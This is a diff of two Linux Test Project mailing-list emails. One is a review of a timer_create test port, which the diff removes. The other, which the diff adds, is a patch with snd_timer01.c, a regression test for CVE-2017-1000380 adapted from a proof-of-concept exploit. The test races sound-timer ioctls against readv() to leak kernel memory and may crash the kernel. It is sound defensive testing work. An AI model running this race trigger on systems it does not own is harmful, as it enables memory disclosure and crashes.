@@ -1,449 +1,235 @@
-From: Cyril Hrubis <chrubis@suse.cz>
-Date: Thu, 11 Jul 2019 15:58:02 +0200
-Subject: [LTP] [PATCH v1] timers/timer_create0{2, 3,
- 4}: Ported to new library
-In-Reply-To: <20190711091819.32556-1-camann@suse.com>
-References: <20190711091819.32556-1-camann@suse.com>
-Message-ID: <20190711135802.GD8709@rei>
+From: Michael Moese <mmoese@suse.de>
+Date: Thu, 11 Jul 2019 15:58:45 +0200
+Subject: [LTP] [PATCH v3] Add a regression test for CVE-2017-1000380
+Message-ID: <20190711135845.14177-1-mmoese@suse.de>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-Hi!
-> Merged timer_create0{2,3} into one test, cleaned up and ported the
-> tests to the new library. Also added several missing clocks and made
-> sure that optional clocks are really tested if they are available.
-> 
-> Signed-off-by: Christian Amann <camann@suse.com>
-> ---
-> 
-> Notes:
->     This is the first step in order to port all the timer tests to the new
->     library. The common_timers.h currently defines a CLEANUP macro which is
->     used by the tests that are still using the old library. The new tests
->     will display an unused-function warning when compiled. This will be
->     removed once the last timer test is ported over.
-> 
->  m4/ltp-time.m4                                     |   2 +-
->  runtest/timers                                     |   1 -
->  testcases/kernel/timers/include/common_timers.h    |  38 +++-
->  testcases/kernel/timers/include/timer_blacklist.h  |  40 ++++
->  testcases/kernel/timers/timer_create/.gitignore    |   1 -
->  .../kernel/timers/timer_create/timer_create02.c    | 232 +++++++--------------
->  .../kernel/timers/timer_create/timer_create03.c    | 156 --------------
->  .../kernel/timers/timer_create/timer_create04.c    | 226 ++++++--------------
->  8 files changed, 217 insertions(+), 479 deletions(-)
->  create mode 100644 testcases/kernel/timers/include/timer_blacklist.h
->  delete mode 100644 testcases/kernel/timers/timer_create/timer_create03.c
-> 
-> diff --git a/m4/ltp-time.m4 b/m4/ltp-time.m4
-> index 9d2954778..c46f1e307 100644
-> --- a/m4/ltp-time.m4
-> +++ b/m4/ltp-time.m4
-> @@ -26,7 +26,7 @@ dnl
->  dnl ----------------------------
->  dnl
->  AC_DEFUN([LTP_CHECK_TIME],[
-> -	AC_CHECK_DECLS([CLOCK_MONOTONIC_RAW, CLOCK_REALTIME_COARSE, CLOCK_MONOTONIC_COARSE],,,[
-> +	AC_CHECK_DECLS([CLOCK_MONOTONIC_RAW, CLOCK_REALTIME_COARSE, CLOCK_MONOTONIC_COARSE, CLOCK_BOOTTIME, CLOCK_REALTIME_ALARM, CLOCK_BOOTTIME_ALARM, CLOCK_TAI],,,[
->  #ifndef _GNU_SOURCE
->  #define _GNU_SOURCE
->  #endif
-> diff --git a/runtest/timers b/runtest/timers
-> index 5f5ecb6ee..54467fa78 100644
-> --- a/runtest/timers
-> +++ b/runtest/timers
-> @@ -1,6 +1,5 @@
->  #DESCRIPTION:Posix Timer Tests
->  timer_create02 timer_create02
-> -timer_create03 timer_create03
->  timer_create04 timer_create04
->  timer_delete02 timer_delete02
->  timer_delete03 timer_delete03
-> diff --git a/testcases/kernel/timers/include/common_timers.h b/testcases/kernel/timers/include/common_timers.h
-> index 313cd4120..59eb8391b 100644
-> --- a/testcases/kernel/timers/include/common_timers.h
-> +++ b/testcases/kernel/timers/include/common_timers.h
-> @@ -6,8 +6,8 @@
->  
->  #ifndef __COMMON_TIMERS_H__
->  #define __COMMON_TIMERS_H__
-> -
->  #define CLEANUP cleanup
-> +
->  #include "config.h"
->  #include "lapi/syscalls.h"
->  
-> @@ -19,15 +19,27 @@ clock_t clock_list[] = {
->  	CLOCK_MONOTONIC,
->  	CLOCK_PROCESS_CPUTIME_ID,
->  	CLOCK_THREAD_CPUTIME_ID,
-> -#if HAVE_CLOCK_MONOTONIC_RAW
-> +#if HAVE_DECL_CLOCK_MONOTONIC_RAW
->  	CLOCK_MONOTONIC_RAW,
->  #endif
-> -#if HAVE_CLOCK_REALTIME_COARSE
-> +#if HAVE_DECL_CLOCK_REALTIME_COARSE
->  	CLOCK_REALTIME_COARSE,
->  #endif
-> -#if HAVE_CLOCK_MONOTONIC_COARSE
-> +#if HAVE_DECL_CLOCK_MONOTONIC_COARSE
->  	CLOCK_MONOTONIC_COARSE,
->  #endif
-> +#if HAVE_DECL_CLOCK_BOOTTIME
-> +	CLOCK_BOOTTIME,
-> +#endif
-> +#if HAVE_DECL_CLOCK_REALTIME_ALARM
-> +	CLOCK_REALTIME_ALARM,
-> +#endif
-> +#if HAVE_DECL_CLOCK_BOOTTIME_ALARM
-> +	CLOCK_BOOTTIME_ALARM,
-> +#endif
-> +#if HAVE_DECL_CLOCK_TAI
-> +	CLOCK_TAI,
-> +#endif
->  };
->  /* CLOCKS_DEFINED is the number of clock sources defined for sure */
->  #define CLOCKS_DEFINED (sizeof(clock_list) / sizeof(*clock_list))
-> @@ -45,14 +57,26 @@ const char *get_clock_str(const int clock_id)
->  	CLOCK_TO_STR(CLOCK_MONOTONIC);
->  	CLOCK_TO_STR(CLOCK_PROCESS_CPUTIME_ID);
->  	CLOCK_TO_STR(CLOCK_THREAD_CPUTIME_ID);
-> -#if HAVE_CLOCK_MONOTONIC_RAW
-> +#if HAVE_DECL_CLOCK_MONOTONIC_RAW
->  	CLOCK_TO_STR(CLOCK_MONOTONIC_RAW);
->  #endif
-> -#if HAVE_CLOCK_REALTIME_COARSE
-> +#if HAVE_DECL_CLOCK_REALTIME_COARSE
->  	CLOCK_TO_STR(CLOCK_REALTIME_COARSE);
->  #endif
-> -#if HAVE_CLOCK_MONOTONIC_COARSE
-> +#if HAVE_DECL_CLOCK_MONOTONIC_COARSE
->  	CLOCK_TO_STR(CLOCK_MONOTONIC_COARSE);
-> +#endif
-> +#if HAVE_DECL_CLOCK_BOOTTIME
-> +	CLOCK_TO_STR(CLOCK_BOOTTIME);
-> +#endif
-> +#if HAVE_DECL_CLOCK_REALTIME_ALARM
-> +	CLOCK_TO_STR(CLOCK_REALTIME_ALARM);
-> +#endif
-> +#if HAVE_DECL_CLOCK_BOOTTIME_ALARM
-> +	CLOCK_TO_STR(CLOCK_BOOTTIME_ALARM);
-> +#endif
-> +#if HAVE_DECL_CLOCK_TAI
-> +	CLOCK_TO_STR(CLOCK_TAI);
->  #endif
->  	default:
->  		return "CLOCK_!?!?!?";
+A race condition was present in the linux kernel, which could lead to
+a leak of arbitrary kernel memory to userspace applications.
 
-Can we change this for a fallback defitions and runtime detection?
+The issue was fixed in those kernel commits:
+ http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
+ http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
 
-In the clock_gettime01.c test we decided that subset of clocks should be
-always present and working and that the newer ones can exit with EINVAL
-which means that they are not supported on currenlty running kernel.
+This patch adds a regression test triggering this race condition.
 
-> diff --git a/testcases/kernel/timers/include/timer_blacklist.h b/testcases/kernel/timers/include/timer_blacklist.h
-> new file mode 100644
-> index 000000000..37a50d2e6
-> --- /dev/null
-> +++ b/testcases/kernel/timers/include/timer_blacklist.h
-> @@ -0,0 +1,40 @@
-> +// SPDX-License-Identifier: GPL-2.0-or-later
-> +/*
-> + * Copyright (c) SUSE LLC, 2019.  All Rights Reserved.
-> + *
-> + * Author:      Christian Amann <camann@suse.com>
-> + */
-> +/*
-> + * Provides support to skip (possibly) unsupported clocks for testing
-> + */
-> +
-> +#ifndef TIMER_BLACKLIST_H
-> +#define TIMER_BLACKLIST_H
-> +
-> +#define BLACKLIST_SIZE ARRAY_SIZE(blacklist_clocks)
-> +
-> +static kernel_timer_t blacklist_clocks[] = {
-> +#if HAVE_DECL_CLOCK_MONOTONIC_RAW
-> +	CLOCK_MONOTONIC_RAW,
-> +#endif
-> +#if HAVE_DECL_CLOCK_MONOTONIC_COARSE
-> +	CLOCK_MONOTONIC_COARSE,
-> +#endif
-> +#if HAVE_DECL_CLOCK_REALTIME_COARSE
-> +	CLOCK_REALTIME_COARSE,
-> +#endif
-> +};
-> +
-> +static int skip_clock(kernel_timer_t clock)
-> +{
-> +	unsigned int i;
-> +
-> +	for (i = 0; i < BLACKLIST_SIZE; ++i) {
-> +		if (clock == blacklist_clocks[i])
-> +			return 1;
-> +	}
-> +	return 0;
-> +}
-> +
-> +
-> +#endif /* TIMER_BLACKLIST_H */
-> diff --git a/testcases/kernel/timers/timer_create/.gitignore b/testcases/kernel/timers/timer_create/.gitignore
-> index f8bec56e9..a04bba838 100644
-> --- a/testcases/kernel/timers/timer_create/.gitignore
-> +++ b/testcases/kernel/timers/timer_create/.gitignore
-> @@ -1,3 +1,2 @@
->  /timer_create02
-> -/timer_create03
->  /timer_create04
-> diff --git a/testcases/kernel/timers/timer_create/timer_create02.c b/testcases/kernel/timers/timer_create/timer_create02.c
-> index 112740052..bae41f595 100644
-> --- a/testcases/kernel/timers/timer_create/timer_create02.c
-> +++ b/testcases/kernel/timers/timer_create/timer_create02.c
-> @@ -1,177 +1,105 @@
-> +// SPDX-License-Identifier: GPL-2.0
->  /*
->   * Copyright (c) Wipro Technologies Ltd, 2003.  All Rights Reserved.
->   *
-> - * This program is free software; you can redistribute it and/or modify it
-> - * under the terms of version 2 of the GNU General Public License as
-> - * published by the Free Software Foundation.
-> - *
-> - * This program is distributed in the hope that it would be useful, but
-> - * WITHOUT ANY WARRANTY; without even the implied warranty of
-> - * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-> - *
-> - * You should have received a copy of the GNU General Public License along
-> - * with this program; if not, write the Free Software Foundation, Inc.,
-> - * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-> + * Author:	Aniruddha Marathe <aniruddha.marathe@wipro.com>
->   *
-> + * Ported to new library:
-> + * 07/2019	Christian Amann <camann@suse.com>
->   */
-> -/**************************************************************************
-> - *
-> - *    TEST IDENTIFIER	: timer_create02
-> - *
-> - *    EXECUTED BY	: anyone
-> - *
-> - *    TEST TITLE	: Basic test for timer_create(2)
-> - *
-> - *    TEST CASE TOTAL	: 3
-> - *
-> - *    AUTHOR		: Aniruddha Marathe <aniruddha.marathe@wipro.com>
-> - *
-> - *    SIGNALS
-> - * 	Uses SIGUSR1 to pause before test if option set.
-> - * 	(See the parse_opts(3) man page).
-> - *
-> - *    DESCRIPTION
-> - *     This is a Phase I test for the timer_create(2) system call.
-> - *     It is intended to provide a limited exposure of the system call.
-> - *
-> - * 	Setup:
-> - *	  Setup signal handling.
-> - *	  Pause for SIGUSR1 if option specified.
-> - *
-> - * 	Test:
-> - *	 Loop if the proper options are given.
-> - *	 Execute system call with different notification types for
-> - *	 clock ID CLOCK_REALTIME
-> - *	 Check return code, if system call failed (return=-1)
-> - *		Log the errno and Issue a FAIL message.
-> - *	 Otherwise, Issue a PASS message.
-> - *
-> - * 	Cleanup:
-> - * 	  Print errno log and/or timing stats if options given
-> +/*
->   *
-> - * USAGE:  <for command-line>
-> - * timer_create02 [-c n] [-e] [-i n] [-I x] [-P x] [-t] [-p]
-> - * where:
-> - * 	-c n : Run n copies simultaneously.
-> - *	-e   : Turn on errno logging.
-> - *	-i n : Execute test n times.
-> - *	-I x : Execute test for x seconds.
-> - *	-p   : Pause for SIGUSR1 before starting
-> - *	-P x : Pause for x seconds between iterations.
-> - *	-t   : Turn on syscall timing.
-> + * Basic test for timer_create(2):
->   *
-> - *RESTRICTIONS:
-> - * None
-> - *****************************************************************************/
-> + *	Creates a timer for each available clock using the
-> + *	following notification types:
-> + *	1) SIGEV_NONE
-> + *	2) SIGEV_SIGNAL
-> + *	3) SIGEV_THREAD
-> + *	4) SIGEV_THREAD_ID
-> + *	5) NULL
-> + */
->  
-> -#include <stdlib.h>
-> -#include <errno.h>
-> -#include <time.h>
->  #include <signal.h>
-> -
-> -#include "test.h"
-> +#include <time.h>
-> +#include "tst_test.h"
-> +#include "tst_safe_macros.h"
->  #include "common_timers.h"
-> -
-> -void setup(void);
-> -void setup_test(int option);
-> -
-> -char *TCID = "timer_create02";	/* Test program identifier.    */
-> -int TST_TOTAL = 3;		/* Total number of test cases. */
-> -static struct sigevent evp, *evp_ptr;
-> -
-> -int main(int ac, char **av)
-> +#include "timer_blacklist.h"
-> +
-> +static struct sigevent evp;
-> +
-> +static struct notif_type {
-> +	int		sigev_signo;
-> +	int		sigev_notify;
-> +	char		*message;
-> +	struct sigevent *sevp;
-> +} types[] = {
-> +	{SIGALRM, SIGEV_NONE, "SIGEV_NONE", &evp},
-> +	{SIGALRM, SIGEV_SIGNAL, "SIGEV_SIGNAL", &evp},
-> +	{SIGALRM, SIGEV_THREAD, "SIGEV_THREAD", &evp},
-> +	{SIGALRM, SIGEV_THREAD_ID, "SIGEV_THREAD_ID", &evp},
-> +	{0, 0, "NULL", NULL},
-> +};
-> +
-> +static void run(unsigned int n)
->  {
-> -	int lc, i, j;
-> -	kernel_timer_t created_timer_id;	/* holds the returned timer_id */
-> -	char *message[3] = {
-> -		"SIGEV_SIGNAL",
-> -		"NULL",
-> -		"SIGEV_NONE"
-> -	};
-> -	const char *mrstr = "MONOTONIC_RAW";
-> -
-> -	tst_parse_opts(ac, av, NULL, NULL);
-> +	unsigned int i, errors;
-> +	struct notif_type *nt = &types[n];
-> +	kernel_timer_t created_timer_id;
-> -	setup();
-> +	tst_res(TINFO, "Testing notification type: %s", nt->message);
->  
-> -	for (lc = 0; TEST_LOOPING(lc); lc++) {
-> +	memset(&evp, 0, sizeof(evp));
->  
-> -		tst_count = 0;
-> +	errors = 0;
-> +	for (i = 0; i < CLOCKS_DEFINED; ++i) {
-> +		clock_t clock = clock_list[i];
->  
-> -		for (i = 0; i < TST_TOTAL; i++) {
-> +		if (skip_clock(clock))
-> +			continue;
->  
-> -			setup_test(i);
-> +		evp.sigev_value  = (union sigval) 0;
-> +		evp.sigev_signo  = nt->sigev_signo;
-> +		evp.sigev_notify = nt->sigev_notify;
->  
-> -			for (j = 0; j < CLOCKS_DEFINED; ++j) {
-> +		if (strstr(get_clock_str(clock), "CPUTIME_ID")) {
-> +			/* (PROCESS_CPUTIME_ID &
-> +			 *  THREAD_CPUTIME_ID)
-> +			 * is not supported on kernel versions
-> +			 * lower than 2.6.12
-> +			 */
-> +			if ((tst_kvercmp(2, 6, 12)) < 0)
-> +				continue;
-> +		}
-> +		if (!strcmp(get_clock_str(clock), "MONOTONIC_RAW"))
-> +			continue;
->  
-> -				if (strstr(get_clock_str(clock_list[j]),
-> -					   "CPUTIME_ID")) {
-> -					/* (PROCESS_CPUTIME_ID &
-> -					 *  THREAD_CPUTIME_ID)
-> -					 * is not supported on kernel versions
-> -					 * lower than 2.6.12
-> -					 */
-> -					if ((tst_kvercmp(2, 6, 12)) < 0) {
-> -						continue;
-> -					}
-> -				}
-> -				if (strstr(get_clock_str(clock_list[j]), mrstr))
-> -					continue;
-> +		if (!strcmp(nt->message, "SIGEV_THREAD_ID"))
-> +			evp._sigev_un._tid = getpid();
->  
-> -				TEST(ltp_syscall(__NR_timer_create,
-> -					clock_list[j], evp_ptr,
-> -					&created_timer_id));
-> +		TEST(tst_syscall(__NR_timer_create,
-> +			clock, nt->sevp,
-> +			&created_timer_id));
->  
-> -				tst_resm((TEST_RETURN == 0 ?
-> -					  TPASS :
-> -					  TFAIL | TTERRNO),
-> -					 "%s %s with notification type = %s",
-> -					 get_clock_str(clock_list[j]),
-> -					 (TEST_RETURN == 0 ?
-> -					  "passed" : "failed"), message[i]);
-> -			}
-> +		if (TST_RET != 0) {
-> +			tst_res(TFAIL | TTERRNO,
-> +				"Clock %s failed", get_clock_str(clock));
-> +			errors++;
->  		}
-> -	}
->  
-> -	cleanup();
-> -	tst_exit();
-> -}
-> -
-> -/* setup_test() - sets up individual test */
-> -void setup_test(int option)
-> -{
-> -	switch (option) {
-> -	case 0:
-> -		evp.sigev_value = (union sigval) 0;
-> -		evp.sigev_signo = SIGALRM;
-> -		evp.sigev_notify = SIGEV_SIGNAL;
-> -		evp_ptr = &evp;
-> -		break;
-> -	case 1:
-> -		evp_ptr = NULL;
-> -		break;
-> -	case 2:
-> -		evp.sigev_value = (union sigval) 0;
-> -		evp.sigev_signo = SIGALRM;	/* any will do */
-> -		evp.sigev_notify = SIGEV_NONE;
-> -		evp_ptr = &evp;
-> -		break;
-> +		TEST(tst_syscall(__NR_timer_delete, created_timer_id));
-> +		if (TST_RET != 0) {
-> +			tst_res(TINFO, "Failed to delete timer %s",
-> +				get_clock_str(clock));
-> +		}
->  	}
-> +	if (!errors)
-> +		tst_res(TPASS,  "All clocks passed!");
+Signed-off-by: Michael Moese <mmoese@suse.de>
+---
 
-Can we instead print PASS/FAIL for each type of clock?
+Changes to v1:
+ - Initialize buffers in ioctl_thread() outside of the loop
+ - use return unused() instead of a void* cast of NULL in ioctl_thread()
+ - reset non-zero flag in run() for every iteration of the main loop
+---
+ runtest/cve                          |   1 +
+ testcases/kernel/Makefile            |   1 +
+ testcases/kernel/sound/.gitignore    |   1 +
+ testcases/kernel/sound/Makefile      |  12 +++
+ testcases/kernel/sound/snd_timer01.c | 140 +++++++++++++++++++++++++++
+ 5 files changed, 155 insertions(+)
+ create mode 100644 testcases/kernel/sound/.gitignore
+ create mode 100644 testcases/kernel/sound/Makefile
+ create mode 100644 testcases/kernel/sound/snd_timer01.c
 
-
-Also this is a big rewrite so the patch would be easier to read with the
--B parameter passed to git format-patch.
-
-
+diff --git a/runtest/cve b/runtest/cve
+index 031bcdc2a..33c9196e0 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -36,6 +36,7 @@ cve-2017-17052 cve-2017-17052
+ cve-2017-16939 cve-2017-16939
+ cve-2017-17053 cve-2017-17053
+ cve-2017-18075 pcrypt_aead01
++cve-2017-1000380 snd_timer01
+ cve-2018-5803 sctp_big_chunk
+ cve-2018-1000001 realpath01
+ cve-2018-19854 crypto_user01
+diff --git a/testcases/kernel/Makefile b/testcases/kernel/Makefile
+index 39d79c7d8..eff5b3e7d 100644
+--- a/testcases/kernel/Makefile
++++ b/testcases/kernel/Makefile
+@@ -52,6 +52,7 @@ SUBDIRS			+= connectors \
+ 			   pty \
+ 			   sched \
+ 			   security \
++			   sound \
+ 			   timers \
+ 			   tracing \
+ 
+diff --git a/testcases/kernel/sound/.gitignore b/testcases/kernel/sound/.gitignore
+new file mode 100644
+index 000000000..57eae0593
+--- /dev/null
++++ b/testcases/kernel/sound/.gitignore
+@@ -0,0 +1 @@
++snd_timer
+diff --git a/testcases/kernel/sound/Makefile b/testcases/kernel/sound/Makefile
+new file mode 100644
+index 000000000..5fdc7dd42
+--- /dev/null
++++ b/testcases/kernel/sound/Makefile
+@@ -0,0 +1,12 @@
++# SPDX-License-Identifier: GPL-2.0-or-later
++
++top_srcdir		:= ../../..
++
++include $(top_srcdir)/include/mk/testcases.mk
++
++CPPFLAGS		+= -D_GNU_SOURCE
++
++LDLIBS 			+= -pthread
++
++
++include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/kernel/sound/snd_timer01.c b/testcases/kernel/sound/snd_timer01.c
+new file mode 100644
+index 000000000..80b03022a
+--- /dev/null
++++ b/testcases/kernel/sound/snd_timer01.c
+@@ -0,0 +1,140 @@
++// SPDX-License-Identifier: GPL-2.0-or-later
++
++/* Copyright (c) 2019 Michael Moese <mmoese@suse.com>
++ * Regression test for CVE-2017-1000380 based on the original PoC exploit
++ * by Alexander Potapenko <glider@google.com>
++ *
++ * Be careful! This test may crash your kernel!
++ *
++ * The test performs several ioctl() parallel with readv() on the same
++ * file descriptor to /dev/snd/timer. A buggy kernel will leak memory
++ * to the process, which may contain information from the the kernel or
++ * any other process on the system.
++ *
++ * The issue was fixed with
++ *   http://git.kernel.org/linus/d11662f4f798b50d8c8743f433842c3e40fe3378
++ *   http://git.kernel.org/linus/ba3021b2c79b2fa9114f92790a99deb27a65b728
++ */
++
++#include "config.h"
++#include "tst_test.h"
++#include "tst_taint.h"
++#include "tst_fuzzy_sync.h"
++#include "tst_safe_macros.h"
++#include "tst_safe_pthread.h"
++
++#include <errno.h>
++#include <fcntl.h>
++#include <pthread.h>
++#include <stdio.h>
++#include <string.h>
++#include <sys/uio.h>
++#include <sys/ioctl.h>
++#include <sound/asound.h>
++
++#define MAX_BUFSIZE 1024
++
++static int snd_fd;
++static struct tst_fzsync_pair fzsync_pair;
++
++static void *ioctl_thread(void *unused)
++{
++	(void) unused;
++	int tread_arg = 1;
++	struct snd_timer_select ts;
++	struct snd_timer_params tp;
++
++	memset(&ts, 0, sizeof(ts));
++	ts.id.dev_class = 1;
++
++	memset(&tp, 0, sizeof(tp));
++	tp.ticks = 1;
++	tp.filter = 0xf;
++
++	while (tst_fzsync_run_b(&fzsync_pair)) {
++
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_TREAD, &tread_arg);
++
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_SELECT, &ts);
++
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_PARAMS, &tp);
++
++		ioctl(snd_fd, SNDRV_TIMER_IOCTL_START, 0);
++
++		tst_fzsync_end_race_b(&fzsync_pair);
++	}
++	return unused;
++}
++
++static void setup(void)
++{
++	tst_fzsync_pair_init(&fzsync_pair);
++	tst_taint_init(TST_TAINT_W | TST_TAINT_D);
++	snd_fd = SAFE_OPEN("/dev/snd/timer",
++			O_RDONLY|O_CREAT|O_NOCTTY|O_SYNC|O_LARGEFILE, 0);
++}
++
++static void cleanup(void)
++{
++	tst_fzsync_pair_cleanup(&fzsync_pair);
++	SAFE_CLOSE(snd_fd);
++}
++
++static void run(void)
++{
++	size_t len;
++	int size;
++	struct iovec iov;
++	pthread_t th;
++	char read_buf[MAX_BUFSIZE];
++	int i, nz;
++	pthread_attr_t thread_attr;
++
++	pthread_attr_init(&thread_attr);
++	pthread_attr_setdetachstate(&thread_attr, PTHREAD_CREATE_DETACHED);
++	SAFE_PTHREAD_CREATE(&th, &thread_attr, ioctl_thread, NULL);
++
++	iov.iov_base = read_buf;
++	iov.iov_len = sizeof(read_buf);
++
++	while (tst_fzsync_run_a(&fzsync_pair)) {
++		nz = 0;
++		memset(read_buf, 0, sizeof(read_buf));
++		size = readv(snd_fd, &iov, 1);
++
++		tst_fzsync_end_race_a(&fzsync_pair);
++
++		/* check if it could be a valid ioctl result */
++		if (size == 0)
++			continue;
++
++		/* check if the buffer is non-empty */
++		for (i = 0; i < size; i++) {
++			if (read_buf[i]) {
++				nz = 1;
++				break;
++			}
++		}
++		if (!nz)
++			continue;
++
++		len = strlen(read_buf);
++		/* the kernel's struct snd_timer_read is two unsigned integers*/
++		if (len <= 2 * sizeof(unsigned int))
++			continue;
++
++		tst_res(TFAIL, "kernel seems vulnerable");
++		return;
++	}
++
++	if (tst_taint_check() != 0)
++		tst_res(TFAIL, "kernel seems vulnerable");
++	else
++		tst_res(TPASS, "kernel seems not vulnerable");
++}
++
++static struct tst_test test = {
++	.test_all = run,
++	.setup = setup,
++	.cleanup = cleanup,
++};
 -- 
-Cyril Hrubis
-chrubis@suse.cz
+2.22.0
+
